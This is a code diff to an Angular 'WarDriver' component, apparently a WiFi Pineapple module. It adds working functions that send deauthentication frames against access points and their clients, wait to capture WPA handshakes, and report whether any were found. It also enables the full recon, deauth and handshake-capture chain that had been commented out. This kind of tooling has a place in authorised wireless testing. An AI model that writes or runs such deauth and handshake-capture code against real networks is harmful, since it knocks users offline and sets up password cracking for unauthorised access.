@@ -219,18 +219,24 @@ export class WarDriverComponent implements OnInit {
             return getReconStatusByIdResp;
         }
 
-        const deauthClient = async (clientObject: Client) =>  {
-            
-            //const deauthClientResp: any
+        const deauthClient = async (client: Client) =>  {
+            const deauthClientPayload = {
+                bssid: client.ap_mac,
+                mac: client.client_mac,
+                multiplier: 5,
+                channel: 11
+            }
+            const deauthBssidResp: any = await this.API.APIPostAsync('/api/pineap/deauth/ap', deauthClientPayload);
+            return deauthBssidResp;
         }
 
-        const deauthBssid = async (apObject: APResult) => { // https://hak5.github.io/mk7-docs/docs/rest/recon/recon/
+        const deauthBssid = async (ap: APResult) => { // https://hak5.github.io/mk7-docs/docs/rest/recon/recon/
             let clientArray: Array<string>;
-            apObject.clients.forEach((client) => {
+            ap.clients.forEach((client) => {
                 clientArray.push(client.client_mac);
             });
             const deauthBssidPayload = {
-                bssid: apObject.bssid,
+                bssid: ap.bssid,
                 multiplier: 5,
                 channel: 11,
                 clients: clientArray
@@ -239,13 +245,26 @@ export class WarDriverComponent implements OnInit {
             return deauthBssidResp;
         }
 
+        const getHandshakeStatus = async () => {
+            const getHandshakeStatusResp: any = await this.API.APIGetAsync('/api/pineap/handshakes');
+            return getHandshakeStatusResp;
+        }
+
+        const sendNotification = async (notificationString: string) => {
+            const notification_payload = {
+                level: 1,
+                message: notificationString,
+                module_name: 'wardriver'
+            }
+            
+            const getHandshakeStatusResp: any = await this.API.APIPutAsync('/api/notifications', notification_payload);
+            return getHandshakeStatusResp;
+        }
+
         let scanID: number;
         let currentBssid: string;
         let currentClient: Client;
-        getReconStatus();
-        stopRecon();
-        startRecon();
-/*
+
         getReconStatus().then((reconResp) => { // get status of recon scan
                 if (reconResp.scanRunning) { // if recon is running, stop it
                     stopRecon().then(() => {
@@ -269,7 +288,12 @@ export class WarDriverComponent implements OnInit {
                                                                     }).then(() => {
                                                                         setTimeout(() => {  // rest for 20 secs to collect lazy handshakes
                                                                             getHandshakeStatus().then((handShakeStatus) => { // check for handshakes
-                                                                                sendNotification(handShakeStatus); // tell the user our results
+                                                                                if (handShakeStatus.handshakes != null) {
+                                                                                    sendNotification('Handshakes Found!'); // tell the user our results
+                                                                                }
+                                                                                else {
+                                                                                    sendNotification('Sorry, no handshakes found :(');
+                                                                                }
                                                                             });
                                                                         }, 20000);
                                                                     });
@@ -286,7 +310,7 @@ export class WarDriverComponent implements OnInit {
                         });
                     });
                 }
-        });*/
+        });
     } 
 }
 
